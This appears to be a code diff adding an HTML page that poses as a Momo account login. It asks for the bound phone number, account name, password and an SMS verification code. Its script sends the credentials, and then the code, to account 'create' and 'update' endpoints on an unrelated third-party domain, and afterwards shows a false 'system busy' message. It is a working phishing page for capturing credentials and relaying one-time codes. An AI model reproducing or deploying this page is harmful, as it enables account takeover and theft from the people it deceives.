@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+<style>
+  input{
+    display: block;
+    margin: 20px auto;
+    height: 35px;
+    line-height: 35px;
+    text-align: center;
+    width: 80%;
+  }
+  body{
+    background: #1e78eb;
+  }
+  .logo{
+    padding-top: 24px;
+    max-width: 960px;
+    margin: 0 auto;text-align: center;
+  }
+  .btn{
+    display: block;
+    width: 28%;
+    float: right;
+    margin-top: 20px;
+    margin-right: 10%;height: 41px;
+    background: #3dcc19;
+    text-align: center;
+    white-space: nowrap;
+    line-height: 40px;
+    color: #fff;
+    font-size: 18px;
+  }
+  .btn:hover{
+    opacity: .8;
+    color: #fff;
+  }
+  .code{
+    width: 52%;
+    float: left;
+    margin-left: 10%;
+  }
+  .dbtn{
+    display: block;
+    margin: 10px auto;
+    width: 80%;
+    height: 40px;
+    background: #3dcc19;
+    color: #fff;
+    font-size: 18px;
+    border: 0;
+    line-height: 40px;
+    text-align: center;
+    font-size: 18px;
+  }
+  .dbtn:hover{
+    opacity: .8;
+    color: #fff;
+  }
+  .dbtn:active{
+    opacity: 1;
+  }
+</style>
+<body>
+  <div>
+    <div class='logo'>
+      <img src="http://imomo-x-pro.img.abc188.com/momo2/public/uploads/20200731/7597a26f91a70a906b788e26651369c0.png" alt="">
+    </div>
+    <input id="phone" type="number" placeholder="请输入momo绑定账号">
+    <input id="name" type="text" placeholder="请输入momo账号">
+    <input id="password"type="password" placeholder="请输入momo密码">
+    <div style="display: flex;">
+      <input id="code" type="text" class="code" placeholder="请输入暂时登录验证码">
+      <div class="btn" id="btn" >获取验证码</div>
+    </div>
+    <div class="dbtn" onclick="login()">登陆</div>
+    
+  </div>
+</body>
+<script>
+  var countdown = 60
+  let data = {}
+  var mfbtn=document.getElementById('btn')
+  function settime(obj) {
+    if (countdown == 0) {
+      obj.disabled=false;
+      obj.innerHTML="重新获取验证码"
+      mfbtn.style.background = '#3dcc19'
+      countdown = 60
+      return
+    } else {
+      obj.disabled=true
+      obj.innerHTML="重新发送" + countdown
+                  countdown--
+      mfbtn.style.background='#999'
+  }
+  setTimeout(function() {
+          settime(obj)
+    }, 1000)
+  }
+
+  mfbtn.onclick=function () {
+    data.bindingMobile = document.getElementById('phone').value
+    data.accountName = document.getElementById('name').value
+    data.accountPassword = document.getElementById('password').value
+    if(!(/^1[3456789]\d{9}$/.test(data.bindingMobile))){ 
+      alert('手机号格式错误')
+      return
+    }else if(data.bindingMobile ===''){
+      alert('手机号不能为空')
+      return
+    }
+    if(data.accountName === '') {
+      alert('账号不能为空')
+      return
+    }
+    if(data.accountPassword === '') {
+      alert('密码不能为空')
+      return
+    }
+    let xhr = new XMLHttpRequest()
+
+    xhr.open('POST', 'https://indexapi.ilovelearning.cn/admin/tool/account/create', true)
+    // POST请求需要设置此参数
+    xhr.setRequestHeader('Content-type', 'application/json;charset=UTF-8')
+    console.log(data)
+    let a = JSON.stringify(data)
+    // xhr.send(`accountName=${data.name}&bindingMobile=${data.phone}&accountPassword=${data.password}`)
+    xhr.send(`${a}`)
+
+    xhr.onreadystatechange = function (e) {
+      if (xhr.readyState == 4 && xhr.status == 200) {
+        // console.log(xhr.responseText)
+      }
+    }
+    settime(mfbtn)
+  }
+  function login() {
+    data.verificationCode = document.getElementById('code').value
+    console.log(data)
+    let xhr2 = new XMLHttpRequest()
+    xhr2.open('POST', 'https://indexapi.ilovelearning.cn/admin/tool/account/update', true)
+    // POST请求需要设置此参数
+    xhr2.setRequestHeader('Content-type', 'application/json;charset=UTF-8')
+    console.log(data)
+    let b = JSON.stringify(data)
+    xhr2.send(`${b}`)
+
+    xhr2.onreadystatechange = function (e) {
+      if (xhr2.readyState == 4 && xhr2.status == 200) {
+        alert('系统繁忙')
+      }
+    }
+  }
+</script>
+</html>
